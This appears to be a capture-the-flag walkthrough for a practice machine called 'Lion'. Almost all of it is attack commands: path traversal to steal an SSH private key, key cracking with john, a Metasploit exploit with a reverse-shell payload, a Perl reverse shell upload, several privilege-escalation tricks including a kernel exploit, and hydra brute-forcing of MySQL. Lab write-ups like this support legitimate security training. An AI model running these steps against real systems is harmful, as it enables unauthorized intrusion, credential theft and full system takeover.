# Lion
# Notes: SSH Port is 1337
## Method 1
3. `curl lion.thm:5555/?page=../../../../../../home/gloria/.ssh/id_rsa`
4. `chmod 777 id_rsa`
5. `ssh2john id_rsa > for_john&&john for_john --wordlist=/usr/share/wordlists/rockyou.txt`. The password is `dance`, you don't have to crack it.
6. `ssh -i id_rsa gloria@lion.thm`
## Method 2
### ExploitDB
1. https://www.exploit-db.com/exploits/47837
### Msfconsole
1. `use exploit/multi/http/nostromo_code_exec`
2. `set rport 8080`
3. `set rhost lion.thm`
4. `set payload linux/x86/meterpreter/reverse_tcp`
5. `set lhost tun0`
6. `exploit`
## Method 3
1. http://lion.thm/upload/
2. Executes `perl` file
3. `cp /usr/share/webshells/perl/perl-reverse-shell.pl .` and configure the IP and PORT values.


## Privilage Esc. 1
1. `export TMUX=/.dev/session,1234,0`
2. `tmux`
## Priv Esc. 2
1. https://github.com/gugronnier/CVE-2017-16995/blob/master/exploit-poc-pentest.c
2. `gcc --static exploit-poc-pentest.c -o exploit-poc-pentest` and upload it
3. `chmod +x ./exploit-poc-pentest`
4. `./exploit-poc-pentest`
## Alex Priv. Esc.
```bash
TF=$(mktemp -d)
echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py
sudo pip install $TF
```
## Flags
	cat /home/gloria/user.txt
	cat /home/marty/user.txt (Reversed)
	cat /home/alex/user.txt (Rot13)
	cat /root/.flag
	cat /opt/code/server.py
		MySQL: db-> blog, table-> users, id-> 140
		`hydra -l root -P /usr/share/wordlists/rockyou.txt lion.thm mysql`
